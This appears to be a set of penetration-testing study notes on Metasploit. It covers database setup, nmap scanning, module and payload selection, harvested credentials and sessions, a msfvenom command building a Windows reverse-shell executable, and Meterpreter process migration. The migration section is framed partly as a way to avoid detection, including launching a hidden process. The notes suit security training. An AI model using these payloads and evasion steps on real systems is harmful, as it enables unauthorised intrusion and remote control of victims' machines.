## Metasploit

```sh
# Start the database service & create and initialize the MSF database
msfdb init

# Enable the database service
sudo systemctl enable postgresql

# Verify database connectivity
db_status

# Create workspace
workspace -a target1

# Scan with nmap
db_nmap -A <TARGET1>

# List of all discovered hosts up
hosts

# Display discovered services
services
services -p 5000 # specific port

# Search all SMB auxiliary modules
search type:auxiliary smb
search apache

# Activate a module
use 5

# Get information about the currently activated module
info

# Display the options of a module
show options

# Get a list of all payloads that are compatible with the currently selected module
show payloads

# set & unset an option
set <OPTION> <VALUE>
unset <OPTION>

# Set a payload
set payload payload/linux/x64/shell_reverse_tcp

# Launch a module
run

# Show vulnerabilities that Metasploit automatically detected based on the results of the executed module
vulns

# Show valid credentials we gathered
creds

# Background session
CTRL + Z

# List all active sessions
sessions -l

# Interact with a session
sessions -i 2
```

## msfvenom
```sh
# List payloads
msfvenom -l payloads --platform windows --arch x64

# Create payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f exe -o file.exe
```

> **Note**: To handle a staged payload don't use netcat. Use Metasploitâ€™s `multi/handler` instead.

## Migrate (meterpreter)

Reason to migrate:
When a host is compromised, the Meterpreter payload runs inside the process used for exploitation. 

* **Stability**: If that process is closed, your access is lost
* **Avoid detection**: The process name may also appear suspicious to defenders
* **Compatibility**: The payload may be 64-bit, but the session is on an 86-bit OS

To avoid this, we can use `migrate` to move the payload to a more stable or inconspicuous process.

> **Note**: Migration is only allowed to processes with the same or lower integrity and privilege level.

```sh
# Show list process
meterpreter > ps

# Migrate
meterpreter > migrate 8052
```

If no suitable process is available for migration, we can use the execute command to create a new process and run the Meterpreter payload within it by specifying a desired command or program.

```sh
# Create a hidden process
meterpreter > execute -H -f notepad

# Migrate
meterpreter > migrate 8052
```
